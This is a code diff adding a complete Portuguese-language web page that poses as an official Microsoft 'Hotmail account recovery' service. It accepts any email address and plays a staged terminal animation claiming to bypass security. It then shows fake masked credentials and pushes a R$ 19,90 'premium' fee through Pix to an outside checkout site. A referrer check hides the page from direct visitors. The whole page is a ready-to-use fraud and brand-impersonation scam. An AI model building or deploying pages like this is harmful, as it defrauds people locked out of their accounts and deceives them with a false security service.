@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Recuperação de Conta Hotmail</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f3f2f1;
+            margin: 0;
+            padding: 0;
+            color: #323130;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
+            padding: 30px;
+        }
+        
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+            display: block;
+        }
+        
+        h1 {
+            color: #0078d4;
+            font-size: 22px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .benefits {
+            margin: 20px 0;
+        }
+        
+        .benefit-item {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .checkmark {
+            color: #107c10;
+            margin-right: 8px;
+            font-weight: bold;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .btn {
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .btn-pix {
+            background-color: #107c10;
+        }
+        
+        .btn:hover {
+            background-color: #106ebe;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .btn-pix:hover {
+            background-color: #0e6a0e;
+        }
+        
+        /* Terminal Style */
+        .terminal {
+            background-color: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            min-height: 200px;
+        }
+        
+        .status-message {
+            margin: 8px 0;
+            white-space: pre-wrap;
+        }
+        
+        .progress-bar {
+            height: 3px;
+            background-color: #003300;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background-color: #00ff00;
+            width: 0%;
+            transition: width 1s;
+        }
+        
+        /* Results */
+        .result-box {
+            background-color: #f3f2f1;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .success-message {
+            color: #107c10;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        
+        .temp-credentials {
+            margin: 15px 0;
+            font-size: 18px;
+            background-color: #eef7ee;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        
+        /* Payment */
+        .payment-card {
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .price {
+            font-size: 28px;
+            color: #0078d4;
+            font-weight: bold;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .payment-features {
+            margin: 20px 0;
+        }
+        
+        .payment-feature {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .feature-icon {
+            color: #107c10;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f7ff;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 15px 0;
+            color: #0078d4;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #605e5c;
+            text-align: center;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-top: 15px;
+            color: #0078d4;
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="screen1">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft" class="logo">
+            
+            <h1>Recuperação de Conta Hotmail</h1>
+            
+            <div class="benefits">
+                <div class="benefit-item"><span class="checkmark">✓</span> Gere uma nova senha segura</div>
+                <div class="benefit-item"><span class="checkmark">✓</span> Receba um código de verificação</div>
+                <div class="benefit-item"><span class="checkmark">✓</span> Acesso em menos de 3 minutos</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Endereço de e-mail do Hotmail:</label>
+                <input type="email" id="email" placeholder="seuemail@hotmail.com">
+            </div>
+            
+            <button class="btn" onclick="startRecovery()">Iniciar Recuperação</button>
+        </div>
+        
+        <div class="card" id="screen2" style="display: none;">
+            <h1>Processando Recuperação</h1>
+            
+            <div class="terminal">
+                <div class="status-message">> Iniciando sistema de recuperação Hotmail v3.1.5</div>
+                <div class="status-message">> Conectando aos servidores Microsoft...</div>
+                
+                <div class="progress-bar">
+                    <div class="progress" id="progressBar"></div>
+                </div>
+                
+                <div id="statusMessages">
+                    <div class="status-message" id="msg1" style="display: none;">> Verificando credenciais no banco de dados...</div>
+                    <div class="status-message" id="msg2" style="display: none;">> Validando informações da conta...</div>
+                    <div class="status-message" id="msg3" style="display: none;">> Bypassando protocolos de segurança...</div>
+                    <div class="status-message" id="msg4" style="display: none;">> Gerando credenciais temporárias...</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card" id="screen3" style="display: none;">
+            <h1>Recuperação Concluída</h1>
+            
+            <div class="result-box">
+                <div class="success-message">SUCESSO! Conta recuperada</div>
+                <div id="recoveredEmail" style="margin: 10px 0; font-weight: bold;"></div>
+                
+                <div class="temp-credentials">
+                    Senha temporária: <strong>H9****4m</strong><br>
+                    Código de verificação: <strong>M****8</strong>
+                </div>
+            </div>
+            
+            <p>Para acesso completo imediato e proteção avançada, ative nosso serviço premium:</p>
+            
+            <button class="btn" onclick="showPaymentScreen()">Ativar Recuperação Premium (R$ 19,90)</button>
+        </div>
+        
+        <div class="card" id="screen4" style="display: none;">
+            <h1>Recuperação Premium Hotmail</h1>
+            
+            <div class="payment-card">
+                <p>Acesso imediato e prioritário à sua conta</p>
+                
+                <div class="price">R$ 19,90</div>
+                
+                <div class="payment-features">
+                    <div class="payment-feature">
+                        <span class="feature-icon">✓</span> Processamento em servidores dedicados
+                    </div>
+                    <div class="payment-feature">
+                        <span class="feature-icon">✓</span> Suporte prioritário 24/7
+                    </div>
+                    <div class="payment-feature">
+                        <span class="feature-icon">✓</span> Proteção contra futuros bloqueios
+                    </div>
+                    <div class="payment-feature">
+                        <span class="feature-icon">✓</span> Garantia de recuperação em 10 minutos
+                    </div>
+                </div>
+                
+                <div class="secure-badge">
+                    <span>🔒</span>&nbsp;Pagamento seguro processado
+                </div>
+                
+                <button class="btn btn-pix" onclick="redirectToCheckout()">Pagar com Pix</button>
+                
+                <a href="#" class="back-link" onclick="showScreen(3)">← Voltar para recuperação básica</a>
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2025 Microsoft Corporation<br>
+            <a href="#" style="color: #0078d4;">Termos de uso</a> | 
+            <a href="#" style="color: #0078d4;">Privacidade</a> | 
+            <a href="#" style="color: #0078d4;">Suporte</a>
+        </div>
+    </div>
+
+    <script>
+        // Verificação de origem segura
+        if (!document.referrer.includes(window.location.hostname) && 
+            !document.referrer.includes('vercel.app')) {
+            window.location.href = '/';
+        }
+
+        function startRecovery() {
+            const email = document.getElementById('email').value;
+            if (!email) {
+                alert('Por favor, insira seu endereço de e-mail');
+                return;
+            }
+            
+            document.getElementById('screen1').style.display = 'none';
+            document.getElementById('screen2').style.display = 'block';
+            document.getElementById('recoveredEmail').textContent = email;
+            
+            // Animar barra de progresso
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '100%';
+            
+            // Mostrar mensagens sequenciais
+            setTimeout(() => { 
+                document.getElementById('msg1').style.display = 'block';
+                document.getElementById('msg1').textContent += ' [OK]';
+            }, 1500);
+            
+            setTimeout(() => { 
+                document.getElementById('msg2').style.display = 'block';
+                document.getElementById('msg2').textContent += ' [VALIDADO]';
+            }, 3500);
+            
+            setTimeout(() => { 
+                document.getElementById('msg3').style.display = 'block';
+                document.getElementById('msg3').textContent += ' [CONCLUÍDO]';
+            }, 5500);
+            
+            setTimeout(() => { 
+                document.getElementById('msg4').style.display = 'block';
+                document.getElementById('msg4').textContent += ' [SUCESSO]';
+                
+                // Ir para tela de resultados
+                setTimeout(() => {
+                    document.getElementById('screen2').style.display = 'none';
+                    document.getElementById('screen3').style.display = 'block';
+                }, 2000);
+            }, 7500);
+        }
+        
+        function showPaymentScreen() {
+            document.getElementById('screen3').style.display = 'none';
+            document.getElementById('screen4').style.display = 'block';
+        }
+        
+        function showScreen(screenNumber) {
+            document.querySelectorAll('.card').forEach(screen => {
+                screen.style.display = 'none';
+            });
+            document.getElementById(`screen${screenNumber}`).style.display = 'block';
+        }
+        
+        function redirectToCheckout() {
+            // Redirecionamento seguro para o checkout
+            window.location.href = 'https://checkout.hot-senha-segura.store/VCCL1O8SC36U';
+        }
+    </script>
+</body>
+</html>
